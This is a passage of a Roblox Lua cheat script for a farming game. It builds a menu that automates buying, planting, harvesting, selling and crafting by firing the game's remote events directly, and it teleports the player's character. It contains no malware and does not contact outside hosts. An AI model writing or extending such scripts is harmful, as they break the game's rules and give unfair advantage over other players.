                        Keybind["5"]["Name"] = [[ChoosenName]];
                        Keybind["5"]["BackgroundTransparency"] = 1;
                        Keybind["5"]["Position"] = UDim2.new(0, 14, 0, 0);

                        -- StarterGui.ScreenGui.KeybindContainer.KeybindText
                        Keybind["6"] = Instance.new("TextLabel", Keybind["2"]);
                        Keybind["6"]["BorderSizePixel"] = 0;
                        Keybind["6"]["BackgroundColor3"] = Color3.fromRGB(180, 114, 0);
                        Keybind["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Keybind["6"]["TextSize"] = 14;
                        Keybind["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
                        Keybind["6"]["AnchorPoint"] = Vector2.new(1, 0);
                        Keybind["6"]["Size"] = UDim2.new(0, 59, 1, -10);
                        Keybind["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Keybind["6"]["Text"] = [[ALT]];
                        Keybind["6"]["Name"] = [[KeybindText]];
                        Keybind["6"]["Position"] = UDim2.new(1, -10, 0, 5);

                        -- StarterGui.ScreenGui.KeybindContainer.KeybindText.UICorner
                        Keybind["7"] = Instance.new("UICorner", Keybind["6"]);
                        Keybind["7"]["CornerRadius"] = UDim.new(0, 10);
                    end

                    Keybind["6"].MouseEnter:Connect(function()
                        Keybind.Hover = true
                    end)

                    Keybind["6"].MouseLeave:Connect(function()
                        Keybind.Hover = false
                    end)

                    function Keybind:Assign(key)
                        Keybind.Status = "Assigned"
                        local thekey = tostring(key):match("Enum.KeyCode.(.*)")
                        Keybind.Keycode = Enum.KeyCode[thekey]
                        Keybind["6"]["Text"] = thekey
                        if Keybind.Listening ~= nil then
                            Keybind.Listening:Disconnect()
                            Keybind.Listening = nil
                        end
                        Keybind.Reading = uis.InputBegan:Connect(function(input, gpe)
                            if gpe then return end
                            if input.UserInputType == Enum.UserInputType.Keyboard and Keybind.Status == "Assigned" then
                                if input.KeyCode == Keybind.Keycode then
                                    options.callback()
                                end
                            end
                        end)
                        Library.SaveConfig(options.flag, tostring(Keybind.Keycode))
                    end

                    function Keybind:UnAssign()
                        Keybind.Status = "NotAssigned"
                        Keybind["6"]["Text"] = "Keybind"
                        if Keybind.Reading ~= nil then
                            Keybind.Reading:Disconnect()
                            Keybind.Reading = nil
                        end
                        Library.DeleteConfigFlag(options.flag)
                    end

                    uis.InputBegan:Connect(function(input, gpe)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and Keybind.Hover then
                            if Keybind.Status == "NotAssigned" then
                                Keybind["6"]["Text"] = "..."
                                Keybind.Listening = uis.InputBegan:Connect(function(input, gpe)
                                    if gpe then return end
                                    if input.UserInputType == Enum.UserInputType.Keyboard and Keybind.Status == "NotAssigned" then
                                        Keybind:Assign(input.KeyCode)
                                    end
                                end)
                            elseif Keybind.Status == "Assigned" then
                                Keybind:UnAssign()
                            end
                        end
                    end)

                    if options.flag ~= nil then
                        local thv = Library.LoadConfig(options.flag)
                        if thv ~= nil then
                            Keybind:Assign(thv)
                        else
                            if options.default ~= nil then
                                local s,r = pcall(function()
                                    Keybind:Assign(options.default)
                                end)
                                if not s then
                                    warn(r)
                                end
                            end
                        end
                    else
                        if options.default ~= nil then
                            local s,r = pcall(function()
                                Keybind:Assign(options.default)
                            end)
                            if not s then
                                warn(r)
                            end
                        end
                    end

                    local currentBounds = Keybind["6"].TextBounds.X
                    local mainFrame = Keybind["6"]
                    mainFrame.Size = UDim2.new(mainFrame.Size.X.Scale, currentBounds + 15, mainFrame.Size.Y.Scale, mainFrame.Size.Y.Offset)
                    mainFrame:GetPropertyChangedSignal("TextBounds"):Connect(function()
                        local currentBounds = Keybind["6"].TextBounds.X
                        Tween(mainFrame, {Size = UDim2.new(mainFrame.Size.X.Scale, currentBounds + 15, mainFrame.Size.Y.Scale, mainFrame.Size.Y.Offset)}, 0.1, "Linear")
                    end)
                end
                return Tab
            end

            return GUI
        end

        local myplayer = game:GetService("Players").LocalPlayer

        local lib = Library:Init()


        local main_tab = lib:CreateTab({
            name = "Main"
        })

        main_tab:CreateSection({
            name = "Auto Buy"
        })

        local AutoBuySeedsToggle;
        main_tab:CreateToggle({
            name = "Auto Buy Seeds",
            default = false,
            callback = function(bool)
                AutoBuySeedsToggle = bool
            end,
        })

        local function get_SeedsData()
            local seeds_list = {}
            local modsc = require(game:GetService("ReplicatedStorage").Data.SeedData)
            for i,v in pairs(modsc) do
                if v["DisplayInShop"] == true and v["StockChance"] ~= 0 then
                    table.insert(seeds_list, i)
                end
            end
            return seeds_list
        end

        local choosenSeeds;
        main_tab:CreateDropdown({
            name = "Seeds",
            options = get_SeedsData(),
            multiple = true,
            callback = function(options)
                choosenSeeds = options
            end,
        })

        local function retrieve_seed_data(seeda)
            local seed_data = {}
            local rarityToNum = {["Common"] = 1, ["Uncommon"] = 2, ["Rare"] = 3, ["Legendary"] = 4, ["Mythical"] = 5, ["Divine"] = 6, ["Prismatic"] = 7}
            local modsc = require(game:GetService("ReplicatedStorage").Data.SeedData)
            for i,v in pairs(modsc) do
                if i == seeda then
                    seed_data["Price"] = v.Price
                    seed_data["Rarity"] = rarityToNum[v.SeedRarity]
                end
            end
            local t = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t:GetData().SeedStock.Stocks) do
                if i == seeda then
                    seed_data["Stock"] = true
                end
            end
            return seed_data
        end

        local function my_sheckles()
            local t = require(game:GetService("ReplicatedStorage").Modules.DataService)
            local sheckles = t:GetData().Sheckles
            if sheckles ~= nil then return sheckles end
        end

        spawn(function()
            while wait() do
                if AutoBuySeedsToggle then
                    if choosenSeeds ~= nil then
                        for i,v in pairs(choosenSeeds) do
                            local seed_tab = retrieve_seed_data(v)
                            if seed_tab["Stock"] == true then
                                if my_sheckles() >= seed_tab["Price"] then
                                    local args = {
                                        v
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuySeedStock"):FireServer(unpack(args))
                                end
                            end
                        end
                    end
                end
            end
        end)

        local function get_egg_list()
            local t = require(game:GetService("ReplicatedStorage").Data.PetEggData)
            local t_t = {}
            for i,v in pairs(t) do
                if v.StockChance ~= 0 then
                    table.insert(t_t, i)
                end
            end
            return t_t
        end

        local AutoBuyEggToggle;
        main_tab:CreateToggle({
            name = "Auto Buy Egg",
            default = false,
            callback = function(bool)
                AutoBuyEggToggle = bool
            end,
        })

        local ChoosenEggsBuy;
        main_tab:CreateDropdown({
            name = "Eggs",
            multiple = true,
            options = get_egg_list(),
            callback = function(options)
                ChoosenEggsBuy = options
            end,
        })

        local function get_egg_stock()
            local t = {}
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().PetEggStock.Stocks) do
                if v["Stock"] ~= 0 then
                    t[i] = v["EggName"]
                end
            end
            return t
        end

        local function choosedegg_in_stock()
            local t = {}
            for i,v in pairs(get_egg_stock()) do
                for i2,v2 in pairs(ChoosenEggsBuy) do
                    if v == v2 then
                        if table.find(t,v) ~= true then
                            table.insert(t,v)
                        end
                    end
                end
            end
            return t
        end

        local function eggname_to_price(eggname)
            local t = require(game:GetService("ReplicatedStorage").Data.PetEggData)
            for i,v in pairs(t) do
                if i == eggname then
                    local price = v.Price
                    if price ~= nil then return price end
                end
            end
        end

        local function get_egg_orderid(eggname)
            for i,v in pairs(get_egg_stock()) do
                if v == eggname then
                    return i
                end
            end
        end
        spawn(function()
            while wait() do
                if AutoBuyEggToggle then
                    if choosedegg_in_stock() ~= nil then
                        if #choosedegg_in_stock() ~= 0 then
                            for i,v in pairs(choosedegg_in_stock()) do
                                if eggname_to_price(v) ~= nil then
                                    if my_sheckles() >= eggname_to_price(v) then
                                        local args = {
                                            get_egg_orderid(v)
                                        }
                                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyPetEgg"):FireServer(unpack(args))
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)

        local isAutoSellingTping;

        main_tab:CreateSection({
            name = "Auto Plant"
        })

        local AutoPlantSeedsToggle;
        main_tab:CreateToggle({
            name = "Auto Plant Seeds",
            default = false,
            callback = function(bool)
                AutoPlantSeedsToggle = bool
            end,
        })

        local function get_SeedsData(try)
            local seeds_list = {}
            if try ~= nil and try == "AddAny" then
                table.insert(seeds_list, "Any")
            end
            local modsc = require(game:GetService("ReplicatedStorage").Data.SeedData)
            for i,v in pairs(modsc) do
                table.insert(seeds_list, i)
            end
            return seeds_list
        end

        local choosenSeedsForAutoPlant;
        main_tab:CreateDropdown({
            name = "Seeds",
            options = get_SeedsData("AddAny"),
            multiple = true,
            callback = function(options)
                choosenSeedsForAutoPlant = options
            end,
        })

        local function get_my_farm()
            for i,v in pairs(game:GetService("Workspace").Farm:GetDescendants()) do
                if v.Name == "Owner" and v:IsA("StringValue") then
                    if v.Value == myplayer.Name then
                        return v.Parent.Parent.Parent
                    end
                end
            end
        end

        local function getRandomPositionInSide()

            local random_side = math.random(1,2)
            local side = get_my_farm().Important.Plant_Locations:GetChildren()[random_side]
            
            local size = side.Size
            local position = side.Position

            local halfSize = size / 2

            local randomX = math.random(-halfSize.X, halfSize.X)
            local randomY = math.random(-halfSize.Y, halfSize.Y)
            local randomZ = math.random(-halfSize.Z, halfSize.Z)

            local randomPosition = position + Vector3.new(randomX, randomY, randomZ)

            return randomPosition
        end

        local function holdingAseed()
            for i,v in pairs(myplayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "Seed" then
                        if table.find(choosenSeedsForAutoPlant, v:GetAttribute("ItemName")) or table.find(choosenSeedsForAutoPlant, "Any") then
                            return v
                        end
                    end
                end
            end
            return nil
        end

        spawn(function()
            while wait() do
                if AutoPlantSeedsToggle then
                    if choosenSeedsForAutoPlant ~= nil then
                        if holdingAseed() == nil then
                            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                                if v:IsA("Tool") then
                                    if v:GetAttribute("ItemType") == "Seed" then
                                        if table.find(choosenSeedsForAutoPlant, v:GetAttribute("ItemName")) or table.find(choosenSeedsForAutoPlant, "Any") then
                                            myplayer.Character.Humanoid:EquipTool(v)
                                        end
                                    end
                                end
                            end
                        elseif holdingAseed() ~= nil then
                            if (myplayer.Character.HumanoidRootPart.Position - get_my_farm().Important.Plant_Locations["Can_Plant"].Position).magnitude > 70 and isAutoSellingTping ~= true then
                                local spoint = get_my_farm()["Spawn_Point"].Position
                                myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(spoint.X, spoint.Y, spoint.Z)
                            elseif (myplayer.Character.HumanoidRootPart.Position - get_my_farm().Important.Plant_Locations["Can_Plant"].Position).magnitude <= 70 then
                                local the_seed = holdingAseed()
                                local rand_pos = getRandomPositionInSide()
                                local args = {
                                    vector.create(rand_pos.X, rand_pos.Y, rand_pos.Z),
                                    the_seed:GetAttribute("ItemName")
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(unpack(args))
                            end
                            
                        end
                    end
                end
            end
        end)

        main_tab:CreateSection({
            name = "Auto Collection"
        })

        local function get_mutations(tra)
            local t = require(game:GetService("ReplicatedStorage").Modules.MutationHandler)
            local t2
            if tra == nil then
                t2 = {"Any"}
            else
                t2 = {}
            end
            for i,v in pairs(t:GetMutations()) do
                table.insert(t2, i)
            end
            return t2
        end

        local function check_mutation(fruit)
            local mutations = {}
            for i,v in pairs(get_mutations()) do
                if fruit:GetAttribute(v) == true then
                    table.insert(mutations, v)
                end
            end
            return mutations
        end

        local function if_has_desired_mut_or_var(fruit_muts, desired_muts)
            if table.find(desired_muts, "Any") then
                return true
            end
            for i,v in pairs(fruit_muts) do
                if table.find(desired_muts, v) then
                    return true
                end
            end
            return false
        end

        local function collect_plant(model)
            local args = {
                buffer.fromstring("\001\001\000\001"),
                {
                    model
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("ByteNetReliable"):FireServer(unpack(args))
        end

        local AutoCollectPlants;
        local choosedMutationAutoCollect;
        local PauseCollection_EventOccuring;

        main_tab:CreateToggle({
            name = "Auto Collect Plants",
            default = false,
            callback = function(bool)
                AutoCollectPlants = bool
            end,
        })

        main_tab:CreateDropdown({
            name = "Mutation",
            multiple = true,
            options = get_mutations(),
            default = "Any",
            callback = function(options)
                choosedMutationAutoCollect = options
            end,
        })

        spawn(function()
            while wait() do
                if AutoCollectPlants and choosedMutationAutoCollect ~= nil and PauseCollection_EventOccuring ~= true then
                    for i,v in pairs(get_my_farm().Important.Plants_Physical:GetDescendants()) do
                        if v:IsA("ProximityPrompt") and v.Enabled == true then
                            local plant_model = v.Parent.Parent
                            local plant_mutations = check_mutation(plant_model)
                            local t = require(game.ReplicatedStorage.Modules.InventoryService)
                            if if_has_desired_mut_or_var(plant_mutations, choosedMutationAutoCollect) and t:IsMaxInventory() == false then
                                collect_plant(plant_model)
                            end
                        end
                    end
                end
            end
        end)

        local function get_events()
            local str = game:GetService("Workspace"):GetAttribute("AllWeather")

            str = str:sub(2, -2)
            local myTable = {}

            for word in str:gmatch('([^,]+)') do
                local trimmedWord = word:gsub('"', ''):gsub('^%s*(.-)%s*$', '%1')
                table.insert(myTable, trimmedWord)
            end

            return myTable
        end

        local function get_current_event()
            local t = {}
            if game:GetService("Workspace"):GetAttribute("CurrentWeatherEvent") ~= nil then
                table.insert(t, game:GetService("Workspace"):GetAttribute("CurrentWeatherEvent")) 
            end
            if game:GetService("Workspace"):GetAttribute("BeeSwarm") == true then
                    table.insert(t, "BeeStorm")
            end
            if game:GetService("Workspace"):GetAttribute("KillerBunny") == true then
                table.insert(t, "KillerBunny")
            end
            if game:GetService("Workspace"):GetAttribute("Thunderstorm") == true then
                table.insert(t, "Thunderstorm")
            end
            for i,v in pairs(get_events()) do
                if game:GetService("Workspace"):GetAttribute(v) == true then
                    table.insert(t, v)
                end
            end
            return t
        end

        local PauseCollectionDuEvAt;
        main_tab:CreateToggle({
            name = "Pause collection during Event/Atmosphere",
            default = false,
            callback = function(bool)
                PauseCollectionDuEvAt = bool
                if bool == false then
                    PauseCollection_EventOccuring = false
                end
            end,
        })

        local EventAtmospherePauseChoosed;
        main_tab:CreateDropdown({
            name = "Event/Atmosphere",
            multiple = true,
            options = get_events(),
            callback = function(options)
                EventAtmospherePauseChoosed = options
            end
        })

        local function check_event_wanted()
            local true_checks = 0;
            if get_current_event() ~= nil then
                local event = get_current_event()
                for i,v in pairs(event) do
                    if table.find(EventAtmospherePauseChoosed, v) then
                        true_checks = true_checks + 1
                    end
                end
                if true_checks > 0 then
                    return true
                else
                    return false
                end
            end
        end

        spawn(function()
            while wait() do
                if PauseCollectionDuEvAt then
                    if check_event_wanted() == true then
                        PauseCollection_EventOccuring = true
                    elseif check_event_wanted() == false then
                        PauseCollection_EventOccuring = false
                    end
                end
            end
        end)

        main_tab:CreateSection({
            name = "Auto Favorite"
        })

        local function get_plants_available()
            local t = {}
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") and v:GetAttribute("Favorite") == false then
                    table.insert(t, v)
                end
            end
            for i,v in pairs(myplayer.Character:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") and v:GetAttribute("Favorite") == false then
                    table.insert(t, v)
                end
            end
            return t
        end

        local function get_plant_mutations(tool)
            local t = {}
            for i,v in pairs(get_mutations()) do
                if tool:GetAttribute(v) == true then
                    table.insert(t,v)
                end
            end
            return t
        end

        local AutoFavoriteToggle;
        local AutoFavoriteToggleListener;
        local MutationChoosenToFavorite;
        main_tab:CreateToggle({
            name = "Auto Favorite Plant",
            default = false,
            callback = function(bool)
                AutoFavoriteToggle = bool
                if AutoFavoriteToggle then
                    for i,v in pairs(get_plants_available()) do
                        local plant_muts = get_plant_mutations(v)
                        for i2,v2 in pairs(MutationChoosenToFavorite) do
                            if table.find(plant_muts, v2) then
                                local args = {
                                    v
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
                            end
                        end
                    end
                    if AutoFavoriteToggleListener == nil then
                        AutoFavoriteToggleListener = myplayer.Backpack.ChildAdded:Connect(function(v)
                            local plant_muts = get_plant_mutations(v)
                            for i2,v2 in pairs(MutationChoosenToFavorite) do
                                if table.find(plant_muts, v2) then
                                    local args = {
                                        v
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
                                end
                            end
                        end)
                    end
                else
                    if AutoFavoriteToggleListener ~= nil then
                        AutoFavoriteToggleListener:Disconnect()
                        AutoFavoriteToggleListener = nil
                    end
                end
            end,
        })

        main_tab:CreateDropdown({
            name = "Mutation",
            multiple = true,
            options = get_mutations("Hi"),
            callback = function(options)
                MutationChoosenToFavorite = options
            end,
        })

        main_tab:CreateSection({
            name = "Auto Sell"
        })

        local AutoSellToggle;
        main_tab:CreateToggle({
            name = "Auto Sell Inventory",
            default = false,
            callback = function(bool)
                AutoSellToggle = bool
            end,
        })

        local sellWhenInventoryCap = 100;
        main_tab:CreateSlider({
            name = "When inventory reaches",
            Min = 2,
            default = 100,
            Max = 200,
            callback = function(value)
                sellWhenInventoryCap = value
            end,
        })

        local function got_plant_inv()
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") == "Holdable" and v:GetAttribute("Favorite") == false then
                    return true
                end
            end
            return false
        end

        spawn(function()
            while wait() do
                if AutoSellToggle then
                    local inv_cap = #myplayer.Backpack:GetChildren()
                    if inv_cap >= sellWhenInventoryCap then
                        if got_plant_inv() then
                            local mypos = myplayer.Character.HumanoidRootPart.Position
                            local npc_pos = game:GetService("Workspace").NPCS.Steven.HumanoidRootPart.Position
                            local range = game:GetService("Workspace").NPCS.Steven.HumanoidRootPart.ProximityPrompt.MaxActivationDistance
                            if (myplayer.Character.HumanoidRootPart.Position - npc_pos).magnitude > range then
                                myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(npc_pos.X, mypos.Y, npc_pos.Z + 5)
                            elseif (myplayer.Character.HumanoidRootPart.Position - npc_pos).magnitude <= range then
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Sell_Inventory"):FireServer()
                            end
                        end
                    end
                end
            end
        end)

        main_tab:CreateSection({
            name = "Queen bee"
        })

        local AutoHoneyToggle;
        main_tab:CreateToggle({
            name = "Auto Honey",
            default = false,
            callback = function(bool)
                AutoHoneyToggle = bool
            end,
        })

        local function check_compressor_full()
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            if t2:GetData().HoneyMachine.PlantWeight < 10 then
                return false
            elseif t2:GetData().HoneyMachine.PlantWeight >= 10 then
                return true
            end
        end

        local function check_ready_compressor()
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            if t2:GetData().HoneyMachine.HoneyStored ~= 0 then
                return true
            else
                return false
            end
        end

        local function honey_interact()
            local args = {
                "MachineInteract"
            }
            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("HoneyMachineService_RE"):FireServer(unpack(args))
        end

        local function get_pollinated_inv()
            local t = {}
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") then
                    if v:GetAttribute("ItemType") == "Holdable" then
                        if v:GetAttribute("Pollinated") == true then
                            table.insert(t, v)
                        end
                    end
                end
            end
            return t
        end

        local temp_fruit;

        spawn(function()
            while wait() do
                if AutoHoneyToggle then
                    if check_ready_compressor() == false then
                        if check_compressor_full() == false then
                            if myplayer.Character:FindFirstChildWhichIsA("Tool") then
                                local tool = myplayer.Character:FindFirstChildWhichIsA("Tool")
                                if tool:GetAttribute("ItemType") == "Holdable" then
                                    if tool:GetAttribute("Pollinated") == true then
                                        honey_interact()
                                        if temp_fruit ~= nil then
                                            temp_fruit = nil
                                        end
                                    end
                                else
                                    if #get_pollinated_inv() ~= 0 then
                                        if temp_fruit == nil then
                                            for i,v in pairs(get_pollinated_inv()) do
                                                temp_fruit = v 
                                            end
                                        elseif temp_fruit ~= nil then
                                            myplayer.Character.Humanoid:EquipTool(temp_fruit)
                                        end
                                    end
                                end
                            else
                                if #get_pollinated_inv() ~= 0 then
                                    if temp_fruit == nil then
                                        for i,v in pairs(get_pollinated_inv()) do
                                            temp_fruit = v 
                                        end
                                    elseif temp_fruit ~= nil then
                                        if temp_fruit.Parent ~= nil and temp_fruit.Parent ~= myplayer.Character then
                                            myplayer.Character.Humanoid:EquipTool(temp_fruit)
                                        end
                                    end
                                end
                            end
                        end
                    elseif check_ready_compressor() == true then
                        honey_interact()
                    end
                end
            end
        end)

        local function get_honey_items()
            local t = require(game:GetService("ReplicatedStorage").Data.HoneyEventShopData)
            local t2 = {}
            for i,v in pairs(t) do
                if v.StockChance ~= 0 and v.DisplayInShop == true then
                    table.insert(t2, i)
                end
            end
            return t2
        end

        local AutoBuyHoneyItemsToggle;
        main_tab:CreateToggle({
            name = "Auto Buy",
            default = false,
            callback = function(bool)
                AutoBuyHoneyItemsToggle = bool
            end,
        })

        local HoneyItemsChoosen;
        main_tab:CreateDropdown({
            name = "Items",
            multiple = true,
            options = get_honey_items(),
            callback = function(options)
                HoneyItemsChoosen = options
            end,
        })

        local function check_honey_stock()
            local t = {}
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().EventShopStock.Stocks) do
                table.insert(t, i)
            end
            return t
        end

        local function check_stock_desired_honey()
            local t = {}
            for i,v in pairs(check_honey_stock()) do
                if table.find(HoneyItemsChoosen, v) then
                    table.insert(t, v)
                end
            end
            return t
        end

        local function honeyitem_to_price(item)
            local t = require(game:GetService("ReplicatedStorage").Data.HoneyEventShopData)
            if t[item] ~= nil then
                return t[item]["Price"]
            end
        end

        local function get_honey_count()
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            local honey = t2:GetData().SpecialCurrency.Honey
            if honey ~= nil then return honey end
        end

        spawn(function()
            while wait() do
                if AutoBuyHoneyItemsToggle then
                    local stock = check_stock_desired_honey()
                    if #stock ~= 0 then
                        for i,v in pairs(check_stock_desired_honey()) do
                            if get_honey_count() >= honeyitem_to_price(v) then
                                local args = {
                                    v
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuyEventShopStock"):FireServer(unpack(args))
                            end
                        end
                    end
                end
            end
        end)

        main_tab:CreateLabel({
            text = "Auto Craft Honey"
        })

        local AutoCraftHoneyToggle;
        main_tab:CreateToggle({
            name = "Auto Craft",
            default = false,
            callback = function(bool)
                AutoCraftHoneyToggle = bool
            end,
        })

        local function got_required_plant()
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            local plant_name_req = t2:GetData().HoneyCrafterEventData.CraftingRecipe.RequiredPlant
            local weight_req = t2:GetData().HoneyCrafterEventData.CraftingRecipe.RequiredPlantSize
            local mutation_req = t2:GetData().HoneyCrafterEventData.CraftingRecipe.RequiredPlantMutation
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") == "Holdable" then
                    if v:GetAttribute("ItemName") == plant_name_req and v:GetAttribute(mutation_req) == true then
                        return v
                    end
                end
            end
            for i,v in pairs(myplayer.Character:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") == "Holdable" then
                    if v:GetAttribute("ItemName") == plant_name_req and v:GetAttribute(mutation_req) == true then
                        return v
                    end
                end
            end
        end

        spawn(function()
            while wait() do
                if AutoCraftHoneyToggle then
                    local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
                    local required_honey_met = t2:GetData().HoneyCrafterEventData.HoneyRequirementMet
                    local required_plant_met = t2:GetData().HoneyCrafterEventData.PlantRequirementMet
                    local honey_amount_required = t2:GetData().HoneyCrafterEventData.CraftingRecipe.HoneyAmountRequired
                    local my_honey = get_honey_count()
                    if required_honey_met == false then
                        if my_honey >= honey_amount_required then
                            local args = {
                                "SubmitHoney"
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("HoneyCrafterRemoteEvent"):FireServer(unpack(args))
                        end
                    end
                    if required_plant_met == false then
                        if got_required_plant() ~= nil then
                            local my_plant = got_required_plant()
                            if my_plant.Parent ~= myplayer.Character then
                                myplayer.Character.Humanoid:EquipTool(my_plant)
                            elseif my_plant.Parent == myplayer.Character then
                                local args = {
                                    "SubmitHeldPlant"
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("HoneyCrafterRemoteEvent"):FireServer(unpack(args))
                            end
                        end
                    end
                    if required_honey_met == true and required_plant_met == true then
                        local args = {
                            "CraftItem"
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("HoneyCrafterRemoteEvent"):FireServer(unpack(args))
                    end
                end
            end
        end)

        local AutoBuyPlantRequiredPlantToggle;
        main_tab:CreateToggle({
            name = "Auto Buy & Plant Required Plant",
            default = false,
            callback = function(bool)
                AutoBuyPlantRequiredPlantToggle = bool
            end,
        })

        local function has_the_seed(seeda)
            for i,v in pairs(myplayer.Backpack:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") == "Seed" and v:GetAttribute("ItemName") == seeda then
                    return v
                end
            end
            for i,v in pairs(myplayer.Character:GetChildren()) do
                if v:IsA("Tool") and v:GetAttribute("ItemType") == "Seed" and v:GetAttribute("ItemName") == seeda then
                    return v
                end
            end
        end

        spawn(function()
            while wait() do
                local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
                local plant_name_req = t2:GetData().HoneyCrafterEventData.CraftingRecipe.RequiredPlant
                local my_seed = retrieve_seed_data(plant_name_req)
                if my_seed ~= nil and my_seed["Stock"] == true then
                    local args = {
                        plant_name_req
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("BuySeedStock"):FireServer(unpack(args))
                end
                if has_the_seed(plant_name_req) ~= nil then
                    local the_seed = has_the_seed(plant_name_req)
                    if the_seed.Parent == myplayer.Character then
                        if (myplayer.Character.HumanoidRootPart.Position - get_my_farm().Important.Plant_Locations["Can_Plant"].Position).magnitude > 70 and isAutoSellingTping ~= true then
                            local spoint = get_my_farm()["Spawn_Point"].Position
                            myplayer.Character.HumanoidRootPart.CFrame = CFrame.new(spoint.X, spoint.Y, spoint.Z)
                        elseif (myplayer.Character.HumanoidRootPart.Position - get_my_farm().Important.Plant_Locations["Can_Plant"].Position).magnitude <= 70 then
                            local rand_pos = getRandomPositionInSide()
                            local args = {
                                vector.create(rand_pos.X, rand_pos.Y, rand_pos.Z),
                                the_seed:GetAttribute("ItemName")
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(unpack(args))
                        end
                    elseif the_seed.Parent == myplayer.Backpack then
                        myplayer.Character.Humanoid:EquipTool(the_seed)
                    end
                end
            end
        end)

        local AutoCollectRequiredPlantToggle;
        main_tab:CreateToggle({
            name = "Auto Collect Required Plant",
            default = false,
            callback = function(bool)
                AutoCollectRequiredPlantToggle = bool
            end,
        })

        spawn(function()
            while wait() do
                if AutoCollectRequiredPlantToggle then
                    local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
                    local plant_name_req = t2:GetData().HoneyCrafterEventData.CraftingRecipe.RequiredPlant
                    local weight_req = t2:GetData().HoneyCrafterEventData.CraftingRecipe.RequiredPlantSize
                    local mutation_req = t2:GetData().HoneyCrafterEventData.CraftingRecipe.RequiredPlantMutation
                    for i,v in pairs(get_my_farm().Important.Plants_Physical:GetDescendants()) do
                        if v:IsA("ProximityPrompt") and v.Enabled == true then
                            local plant_model = v.Parent.Parent
                            if plant_model.Name == plant_name_req and plant_model:GetAttribute(mutation_req) == true and plant_model:FindFirstChild("Weight").Value == weight_req then
                                collect_plant(plant_model)
                            end
                        end
                    end
                end
            end
        end)

        local AutoFavoriteRequiredPlantToggle;
        main_tab:CreateToggle({
            name = "Auto Favorite Required Plant",
            default = false,
            callback = function(bool)
                AutoFavoriteRequiredPlantToggle = bool
            end,
        })

        spawn(function()
            while wait() do
                if AutoFavoriteRequiredPlantToggle then
                    if got_required_plant() then
                        local my_plant = got_required_plant()
                        if my_plant:GetAttribute("Favorite") == false then
                            local args = {
                                my_plant
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
                        end
                    end
                end
            end
        end)

        local function get_maxpets_inv()
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            local max = t2:GetData().PetsData.MutableStats.MaxPetsInInventory
            if max ~= nil then return max end
        end

        local function get_pet_inv_count()
            local count = 0
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().PetsData.PetInventory.Data) do
                count = count + 1
            end
            return count
        end

        local function get_maxequip_pets()
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            local max = t2:GetData().PetsData.MutableStats.MaxEquippedPets
            if max ~= nil then return max end
        end

        local function get_equipped_pets_count()
            local count = 0
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            for i,v in pairs(t2:GetData().PetsData.EquippedPets) do
                count = count + 1
            end
            return count
        end

        local function get_maxeggs_farm()
            local t2 = require(game:GetService("ReplicatedStorage").Modules.DataService)
            local max = t2:GetData().PetsData.MutableStats.MaxEggsInFarm
            if max ~= nil then return max end
        end

        main_tab:CreateSection({
            name = "Auto Egg"
        })

        local AutoPlaceEggToggle;
        main_tab:CreateToggle({
            name = "Auto Place Egg",
            default = false,
            callback = function(bool)
                AutoPlaceEggToggle = bool
